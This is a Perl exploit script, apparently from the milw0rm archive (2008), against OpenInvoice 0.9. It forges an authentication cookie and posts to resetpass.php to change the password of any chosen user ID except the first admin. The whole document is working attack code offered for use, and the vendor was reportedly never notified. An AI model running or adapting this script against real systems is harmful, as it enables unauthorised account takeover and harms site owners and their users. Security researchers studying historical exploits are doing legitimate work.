<html><head><title>OpenInvoice 0.9 Arbitrary Change User Password Exploit</title></head><pre>#!/usr/bin/perl

# [ OpenInvoice 0.9 Arbitrary Change User Password Exploit ]
# Discovered &amp;&amp; Coded By t0pP8uZz
# Discovered On: 18 April 2008
# Vendor has not been notified!

# see exploit for more details..

# Greetz: milw0rm.com, h4ck-y0u.org, CipherCrew!

use strict;
use LWP::UserAgent;
use HTTP::Cookies;

print &quot;-+- [ OpenInvoice 0.9 Arbitrary Change User Password Exploit ] -+-\n&quot;;
print &quot;-+-             (Discovered &amp;&amp; Coded By t0pP8uZz)              -+-\n&quot;;
print &quot;-+-                                                            -+-\n&quot;;
print &quot;-+-   Discovered On: 18 April 2008 / Discovered By: t0pP8uZz   -+-\n&quot;;
print &quot;-+- OpenInvoice 0.9 beta (and prior) Suffers from Insecure ... -+-\n&quot;;
print &quot;-+- ...cookies and admin panel validating, combining the two.. -+-\n&quot;;
print &quot;-+- .we can change any users password except for the 1st admin -+-\n&quot;;
print &quot;-+-                                                            -+-\n&quot;;
print &quot;-+- [ OpenInvoice 0.9 Arbitrary Change User Password Exploit ] -+-\n&quot;;

print &quot;\nEnter URL (the vuln site): &quot;;
	chomp(my $url=&lt;STDIN&gt;);
	
print &quot;\nEnter UID (the user id to change pass for): &quot;;
	chomp(my $uid=&lt;STDIN&gt;);
	
my $domain = $url;
my $count = ($domain =~ tr&quot;/&quot;&quot;);

if($count == 1) {
	$domain =~ s/\\//;
} elsif($count &gt;= 3) {
	$domain =~ s/http:\/\///;
}

my $cjar = HTTP::Cookies-&gt;new( file =&gt; &quot;cookies.txt&quot;, autosave =&gt; 1 );
$cjar-&gt;set_cookie(1, &quot;oiauth&quot;, &quot;1&quot;, &quot;/&quot;, &quot;6oogle.pl&quot;);
$cjar-&gt;save(&quot;cookies.txt&quot;);

my $ua     = LWP::UserAgent-&gt;new( agent =&gt; 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1 )', cookie_jar =&gt; $cjar );
my $result = $ua-&gt;post($url.&quot;/resetpass.php&quot;, { 'uid' =&gt; $uid, 'changepass' =&gt; 'Change Password' } );

if($result-&gt;is_success() &amp;&amp; $result-&gt;content !~ /unable to change password/i &amp;&amp; $uid != 1) {
	print &quot;Password successfuly changed for userid: &quot;.$uid.&quot;\n&quot;;
	exit;
}
print &quot;Exploit Failed! check domain is running OpenInvoice &lt;= 0.9, Check UID isnt 1\n&quot;;
exit;

# milw0rm.com [2008-04-18]</pre></html>